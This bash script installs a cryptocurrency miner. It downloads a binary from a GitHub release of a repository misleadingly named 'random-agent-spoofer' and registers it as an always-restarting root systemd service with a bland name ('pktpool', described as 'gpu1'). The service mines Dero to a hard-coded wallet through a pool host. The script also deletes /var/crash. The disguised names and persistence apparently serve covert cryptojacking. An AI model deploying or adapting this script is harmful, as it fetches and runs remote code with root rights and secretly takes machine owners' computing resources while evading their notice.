#!/bin/bash
count=`pgrep sang |  grep -o -E '[0-9]+'`

if [[ $count == "" ]]
then

wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/astro -O /home/ubuntu/sang 
sudo chmod +x /home/ubuntu/sang 
chmod +x /home/ubuntu/sang 
sudo rm -rf /lib/systemd/system/pktpool.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/ubuntu/sang  -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcpvuc95p8a0rssl0xhzl -r community-pools.mysrv.cloud:10300 -p rpc 
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&

sudo systemctl daemon-reload &&
sudo systemctl enable pktpool.service &&
sudo service pktpool stop  &&
sudo service pktpool restart


 
else
echo "dang ton tai"

fi


